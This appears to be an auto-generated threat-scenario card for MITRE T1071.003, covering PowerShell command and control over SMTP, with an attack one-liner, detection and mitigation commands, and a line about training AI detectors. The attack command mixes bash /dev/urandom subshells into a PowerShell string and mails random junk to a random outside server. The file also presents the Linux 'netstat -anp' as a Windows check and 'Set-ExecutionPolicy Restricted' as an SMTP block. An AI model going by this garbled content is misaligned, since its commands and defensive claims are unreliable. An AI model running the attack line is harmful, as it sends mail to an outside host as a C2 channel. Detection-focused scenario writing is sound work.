---
type: campaign
scenario_id: 200
tactic: Command and Control
technique: "T1071.003: Application Layer Protocol: Mail Protocols"
technique_id: T1071.003
tags: [campaign, lotl, command_and_control]
---

# Using PowerShell to send C2 commands via SMTP.

## Threat Description
Using PowerShell to send C2 commands via SMTP.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Send-MailMessage -To '$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@example.com' -From '$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@example.com' -Subject '$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)' -Body '$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)' -SmtpServer $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com"
```

## Detection Logic
Monitor SMTP activity: `wmic process where name='powershell.exe' get commandline | findstr Send-MailMessage`; Monitor SMTP traffic: `netstat -anp | grep :25`.

## Mitigation
Restrict PowerShell SMTP: `Set-ExecutionPolicy Restricted`; Block SMTP outbound: `netsh advfirewall firewall add rule name='Block SMTP' dir=out action=block protocol=TCP remoteport=25`.

## AI Training Prompt
Train AI to detect PowerShell SMTP C2 and suggest SMTP restrictions.

## References
- MITRE ATT&CK T1071.003: https://attack.mitre.org/techniques/T1071/003/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
